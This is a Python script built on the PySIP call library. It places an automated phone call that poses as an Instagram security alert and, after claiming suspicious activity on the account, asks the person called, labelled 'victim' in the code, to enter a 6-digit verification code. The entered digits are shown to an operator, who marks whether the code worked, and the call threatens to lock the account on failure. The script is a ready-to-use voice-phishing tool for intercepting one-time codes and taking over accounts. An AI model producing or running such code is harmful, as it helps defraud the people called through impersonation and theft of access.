import random
import asyncio

from PySIP.call_handler import CallHandler


def typing_cb():
    print("Victim typing code..")


DELAY_ERR_MESSAGE = "We did not receive any input. Please enter the 6-digit code we just sent to your registered email address."

DELAY_ERR_MESSAGE_2 = "Please press 1 to confirm this was not you, or press 2 to continue with the verification process."


async def instagram_script(call_handler: CallHandler, victim_name: str):
    try:
        # Phase 1
        await call_handler.say(
            f"Hello {victim_name}, this is a security alert from Instagram."
        )
        await call_handler.say(
            "We have detected suspicious activity on your account, and we need to verify your identity to prevent unauthorized access."
        )

        # Phase 2
        code_correct = False
        attempts = 0
        max_attempts = 2
        asyncio.create_task(call_handler.dtmf_handler.started_typing(typing_cb))

        while not code_correct and attempts < max_attempts:
            code = str(random.randint(100000, 999999))
            await call_handler.say(
                "To confirm your identity, please enter the 6-digit code we have sent to your number, followed by the pound key."
            )
            dtmf_result = await call_handler.gather_and_say(
                length=6, delay=8, finish_on_key="#", delay_msg=DELAY_ERR_MESSAGE
            )

            if dtmf_result:
                print("The DTMF result is:-> ", dtmf_result)
                entered_code = input("Is this code correct?: ")
                if entered_code == "1":
                    code_correct = True
                    stream_id = await call_handler.say(
                        "Thank you for verifying your identity. Your account is now secured. Goodbye."
                    )
                    await stream_id.wait_finished()
                    await call_handler.hangup()
                    print("Script Instagram completed running..")
                else:
                    attempts += 1
                    print(attempts)
                    if attempts == max_attempts:
                        stream = await call_handler.say(
                            "You have exceeded the maximum number of attempts. For security reasons, we will have to lock your account. Goodbye."
                        )
                        await stream.wait_finished()
                        await call_handler.hangup()
                        print("Script Instagram failed due tp maximum attempts reached.")
                    else:
                        await call_handler.say(
                            "The code you entered is incorrect. Please try again."
                        )
            else:
                stream = await call_handler.say(
                    "No code entered. For security reasons, we will have to lock your account. Goodbye."
                )
                await stream.wait_finished()
                await call_handler.hangup()
                print("Script Instagram failed due to no code entered.")

    except RuntimeError:
        print("The call is hanged up. Stopping the script...")
